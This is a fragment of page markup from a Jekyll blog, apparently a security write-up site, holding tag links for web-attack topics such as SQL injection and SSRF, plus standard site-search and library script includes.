href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/file-upload/">file-upload</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/ssti/">ssti</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/awscli/">awscli</a> <a class="post-tag" href="/tags/dns/">dns</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
